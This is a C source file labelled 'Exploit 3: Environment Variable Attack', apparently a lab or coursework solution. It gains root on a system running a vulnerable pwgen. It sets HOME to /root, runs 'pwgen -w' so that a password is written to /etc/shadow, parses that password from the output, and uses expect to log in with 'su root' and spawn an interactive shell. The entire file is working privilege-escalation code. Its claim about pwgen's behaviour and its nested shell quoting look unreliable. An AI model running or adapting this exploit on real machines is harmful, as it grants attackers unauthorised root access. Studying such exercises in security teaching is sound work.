// Exploit 3: Environment Variable Attack
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define PASSWD_SZ 8
#define COMMAND_LENGTH 256
#define BUFFER_SIZE 128
#define GENERATED_PASSWD_OFFSET 31

int main() {
  char password[PASSWD_SZ + 1];
  FILE *fp;

  // Set the HOME environment variable to /root
  if (setenv("HOME", "/root", 1) != 0) {
    perror("setenv");
    exit(EXIT_FAILURE);
  }

  // Use popen to execute pwgen with the --write flag
  // This will cause pwgen to write the password to /etc/shadow
  fp = popen("pwgen -w", "r");
  if (fp == NULL) {
    perror("popen");
    exit(EXIT_FAILURE);
  }

  // Read the generated password from the output of pwgen
  char buffer[BUFFER_SIZE];
  if (fgets(buffer, BUFFER_SIZE, fp) == NULL) {
    perror("fgets");
    pclose(fp);
    exit(EXIT_FAILURE);
  }
  strncpy(password, buffer + GENERATED_PASSWD_OFFSET, PASSWD_SZ);
  pclose(fp);

  // Use the password to gain root access
  char command[COMMAND_LENGTH];
  snprintf(command, sizeof(command),
           "expect -c 'spawn su root -c \'sh\'; expect \"Password:\"; send "
           "\"%s\\r\"; interact'",
           password);
  system(command);

  return 0;
}